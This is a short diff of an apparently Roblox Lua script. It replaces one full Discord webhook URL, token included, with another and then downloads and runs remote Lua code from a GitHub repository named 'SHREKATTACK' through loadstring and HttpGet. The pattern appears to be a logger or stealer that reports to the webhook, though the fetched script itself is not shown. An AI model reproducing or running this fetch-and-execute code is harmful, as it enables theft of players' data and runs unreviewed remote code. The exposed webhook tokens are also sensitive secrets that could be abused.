@@ -1,4 +1,4 @@
-_G.webhooksdiscord = "https://discord.com/api/webhooks/947370025877127208/osmu7wwABiTa1LK2fJFUuLW9c_3FYsZXFj7tkFsVCgoCkpPZudOZXejzuji5M9tbnQdS"
+_G.webhooksdiscord = "https://discord.com/api/webhooks/947370023251505163/UUHnaBZHcsPcKgmQZjl64M59p6t1MhOcg0Rnnz9CjoSDihBhuRic2y-E1TVOo7IebqwN"
 loadstring(game:HttpGet"https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua")();
 
 local PlaceId = game.PlaceId
